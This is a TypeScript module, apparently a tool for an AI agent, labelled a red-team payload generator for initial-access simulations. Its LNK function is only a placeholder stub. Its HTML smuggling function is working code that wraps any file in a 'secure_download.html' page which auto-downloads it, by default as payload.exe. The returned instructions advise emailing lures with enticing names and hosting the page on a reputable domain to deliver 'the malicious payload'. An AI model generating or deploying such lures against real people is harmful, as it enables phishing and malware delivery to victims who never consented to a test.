import { createSubsystemLogger } from "../logging/subsystem.js";
import path from "node:path";
import fs from "node:fs";

const log = createSubsystemLogger("tools/payloads");

export interface PayloadResult {
    type: string;
    path: string;
    instructions: string;
}

/**
 * Red Team Payload Generator: Creates lures for initial access simulations.
 */
export class PayloadGenerator {
    private outputDir: string;

    constructor() {
        this.outputDir = path.join(process.cwd(), "payloads");
        if (!fs.existsSync(this.outputDir)) {
            fs.mkdirSync(this.outputDir, { recursive: true });
        }
    }

    async generateLNK(command: string): Promise<PayloadResult> {
        log.info(`Generating LNK payload with command: ${command}`);
        const payloadPath = path.join(this.outputDir, "invoice.lnk");

        // Logical representation for agent context
        // In reality, this would use a library or a template file
        fs.writeFileSync(payloadPath, `[LNK_SIMULATION]\nCommand: ${command}`);

        return {
            type: "LNK Link File",
            path: payloadPath,
            instructions: "Deliver via email with an enticing name. Executing starts the encoded command."
        };
    }

    async generateHTMLSmuggling(fileContent: string, fileName: string): Promise<PayloadResult> {
        log.info(`Generating HTML Smuggling payload for: ${fileName}`);
        const payloadPath = path.join(this.outputDir, "secure_download.html");

        const template = `
        <html>
            <body>
                <script>
                    const blob = new Blob([atob("${Buffer.from(fileContent).toString('base64')}")], {type: 'application/octet-stream'});
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = "${fileName}";
                    a.click();
                </script>
                <h2>Your file is downloading...</h2>
            </body>
        </html>
        `;

        fs.writeFileSync(payloadPath, template);

        return {
            type: "HTML Smuggling",
            path: payloadPath,
            instructions: "Host on a reputable domain. When visited, it automatically triggers a download of the malicious payload."
        };
    }
}

/**
 * Tactical Tool implementation for Payload Generation.
 */
export async function generateRedTeamPayload(args: { type: "lnk" | "html_smuggling", data: string, name?: string }) {
    const generator = new PayloadGenerator();
    if (args.type === "lnk") {
        return await generator.generateLNK(args.data);
    } else {
        return await generator.generateHTMLSmuggling(args.data, args.name || "payload.exe");
    }
}
